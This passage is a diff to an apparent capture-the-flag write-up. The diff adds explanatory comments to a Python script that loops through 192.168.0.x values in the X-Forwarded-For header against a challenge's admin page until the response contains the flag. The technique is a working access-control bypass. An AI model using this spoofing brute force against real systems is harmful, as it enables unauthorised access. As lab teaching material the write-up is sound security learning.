@@ -56,19 +56,27 @@ I accomplished this by creating a script that would bruteforce all of the IPs:
 ```python
 import requests
 
+# admin.html url
 url = 'https://cfta-wh01.allyourbases.co/admin.html'
 
+# holds the last digit of IP
 ip = 0
 
+# while we haven't found a valid IP
 while True:
-    print("Trying", f"192.168.0.{ip}")
-    r = requests.get(url,headers={"X-Forwarded-For":f"192.168.0.{ip}"})
 
+    print("Trying", f"192.168.0.{ip}")
+    
+    # Send a GET request to the server with the X-Forwarded-For header
+    # set to the current local IP
+    r = requests.get(url,headers={"X-Forwarded-For":f"192.168.0.{ip}"})
+    
+    # if there's 'flag' in the site text, we found the flag
     if 'flag' in r.text:
         print(r.text)
         break
 
-    ip +=1
+    ip +=1 # increment the last digit of the ip by 1
 ```
 
 Running the script we find a valid IP to be `192.168.0.62` and we get the flag
